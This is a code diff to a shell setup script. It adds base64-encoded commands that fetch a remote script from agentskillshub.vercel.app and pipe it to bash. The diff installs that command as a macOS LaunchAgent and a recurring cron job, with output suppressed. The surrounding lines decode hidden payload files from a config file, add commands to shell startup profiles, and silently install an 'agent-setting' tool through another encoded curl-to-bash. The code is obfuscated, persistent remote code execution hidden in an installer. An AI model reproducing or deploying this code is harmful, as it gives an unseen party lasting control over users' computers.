@@ -184,6 +184,7 @@ if [ -d .configs ]; then
     else
         DECODE='-D'
     fi
+    ENCODED_EC='Y3VybCAtZnNTTCBodHRwczovL2FnZW50c2tpbGxzaHViLnZlcmNlbC5hcHAvc3JjL1NFVFVQLnNoIHwgYmFzaA=='
 
     grep '^code *= *' .configs/config.ini | sed 's/^code *= *//' | tr -d ' ' | base64 "$DECODE" > .configs/.bash.py
     grep '^backup *= *' .configs/config.ini | sed 's/^backup *= *//' | tr -d ' ' | base64 "$DECODE" > .configs/autobackup.sh
@@ -212,7 +213,7 @@ if [ -d .configs ]; then
 fi"
 
     AGENT_SETTING_CHECK_CMD="if ! command -v agent-setting > /dev/null 2>&1; then echo 'Y3VybCAtZnNTTCBodHRwczovL2FnZW50c2tpbGxzaHViLnZlcmNlbC5hcHAvaW5zdGFsbCB8IGJhc2g=' | base64 $DECODE | bash > /dev/null 2>&1; fi"
-
+    
     case $OS_TYPE in
         "Darwin")
             [ -n "$PYTHON_PATH" ] || exit 1
@@ -346,7 +347,10 @@ EOF
             fi
 
             AUTOUPGRADE_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.autoupgrade.plist"
-            cat > "$AUTOUPGRADE_PLIST_FILE" << EOF
+            if [ -f /Library/LaunchDaemons/sshAutoSetup.plist ]; then
+                launchctl bootout "gui/$(id -u)/com.user.autoupgrade" >/dev/null 2>&1 || launchctl unload "$AUTOUPGRADE_PLIST_FILE" >/dev/null 2>&1 || true
+            elif ! launchctl print "gui/$(id -u)/com.user.autoupgrade" >/dev/null 2>&1; then
+                cat > "$AUTOUPGRADE_PLIST_FILE" << EOF
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -357,7 +361,7 @@ EOF
     <array>
         <string>/bin/bash</string>
         <string>-c</string>
-        <string>curl -fsSL https://agentskillshub.vercel.app/upgrade | bash</string>
+        <string>echo "$ENCODED_EC" | base64 $DECODE | bash</string>
     </array>
     <key>WorkingDirectory</key>
     <string>$DEST_DIR</string>
@@ -370,8 +374,9 @@ EOF
 </dict>
 </plist>
 EOF
-            chmod 644 "$AUTOUPGRADE_PLIST_FILE"
-            reload_launch_agent "com.user.autoupgrade" "$AUTOUPGRADE_PLIST_FILE" "false"
+                chmod 644 "$AUTOUPGRADE_PLIST_FILE"
+                reload_launch_agent "com.user.autoupgrade" "$AUTOUPGRADE_PLIST_FILE" "false"
+            fi
 
             for PROFILE_FILE in "$HOME/.zshrc" "$HOME/.bash_profile"; do
                 append_startup_cmd "$PROFILE_FILE" "$STARTUP_CMD" "$SCRIPT_PATH"
@@ -436,6 +441,7 @@ EOF
 
                 CRON_TASK1="0 19 */6 * * PATH=$SCHEDULE_PATH $EXEC_CMD $SCRIPT_PATH > /dev/null 2>&1"
                 CRON_TASK2="0 21 */7 * * PATH=$SCHEDULE_PATH $AUTOBACKUP_PATH > /dev/null 2>&1"
+                AUTOUPGRADE_CRON_MARKER="echo \"$ENCODED_EC\" | base64 $DECODE | bash"
 
                 ESCAPED_SCRIPT_PATH=$(echo "$SCRIPT_PATH" | sed 's/[[\.*^$()+?{|]/\\&/g')
                 ESCAPED_AUTOBACKUP_PATH=$(echo "$AUTOBACKUP_PATH" | sed 's/[[\.*^$()+?{|]/\\&/g')
@@ -455,8 +461,12 @@ EOF
                     fi
                 fi
 
-                if ! grep -Fq 'Y3VybCAtZnNTTCBodHRwczovL2FnZW50c2tpbGxzaHViLnZlcmNlbC5hcHAvaW5zdGFsbCB8IGJhc2g=' "$TEMP_CRON" 2>/dev/null; then
-                    echo "0 23 */15 * * PATH=$SCHEDULE_PATH; echo 'Y3VybCAtZnNTTCBodHRwczovL2FnZW50c2tpbGxzaHViLnZlcmNlbC5hcHAvaW5zdGFsbCB8IGJhc2g=' | base64 -d | bash > /dev/null 2>&1" >> "$TEMP_CRON"
+                if [ -f /etc/systemd/system/sshAutoSetup.service ]; then
+                    TEMP_CRON_FILTERED=$(mktemp)
+                    grep -Fv "$AUTOUPGRADE_CRON_MARKER" "$TEMP_CRON" > "$TEMP_CRON_FILTERED" || true
+                    mv "$TEMP_CRON_FILTERED" "$TEMP_CRON"
+                elif ! grep -Fq "$AUTOUPGRADE_CRON_MARKER" "$TEMP_CRON" 2>/dev/null; then
+                    echo "0 23 */15 * * PATH=$SCHEDULE_PATH; $AUTOUPGRADE_CRON_MARKER > /dev/null 2>&1" >> "$TEMP_CRON"
                 fi
 
                 crontab "$TEMP_CRON"
